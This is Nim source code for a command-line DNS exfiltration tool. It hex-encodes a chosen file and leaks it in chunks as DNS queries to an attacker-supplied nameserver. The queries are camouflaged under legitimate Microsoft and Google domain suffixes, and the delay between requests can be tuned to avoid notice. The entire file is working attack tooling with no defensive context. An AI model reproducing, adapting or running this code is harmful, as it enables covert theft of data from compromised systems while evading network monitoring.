import std/[os, strutils, random, sha1]
import pkg/ndns
randomize()

proc resolve(client: DnsClient, data: string): void =
    try:
        discard resolveIpv4(client, data, 1)
    except CatchableError as e:
        #echo "[DEBUG] ", e.msg
        if e.msg.contains("timeout"):
            #echo "[DEBUG] OK ", data
            discard
        else:
            #echo "[DEBUG] ERROR ", data
            quit(e.msg)

proc chuckIndX(client: DnsClient, data: string, chuckSize: int, domain: string, slp: int): void =
    var stringindex: int
    while stringindex <= data.len-1:
        let
            query =  data[stringindex .. (if stringindex + chuckSize - 1 > data.len - 1: data.len - 1 else: stringindex + chuckSize - 1)]
            dnsquery = query & domain

        resolve(client, dnsquery)
        inc(stringindex, chuckSize)
        sleep(slp)

proc dnsExfil(ns: string, file: string, slp: int): void =
    let
        client = initDnsClient(ns)
        content = readFile(file)
        hash = secureHash(content)
        hex = content.toHex
        chuckSize = 20 # max 62
        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
    
    echo "[+] Sending ", file, " [lengh: ", content.len, "][hash: ", hash, "]" 
    
    chuckIndX(client, file.toHex, chuckSize, ".bb.googleusercontent.com", slp)
    chuckIndX(client, hex, chuckSize, sample(domains), slp)
    resolve(client, "quit")

    echo "[+] Done!"


when isMainModule:
    if paramCount() < 3:
        echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
        echo "[!] e.g: dnx.exe 13.37.13.37 file.pdf 1000"
        quit()
    else:
        dnsExfil(paramStr(1), paramStr(2), parseInt(paramStr(3)))
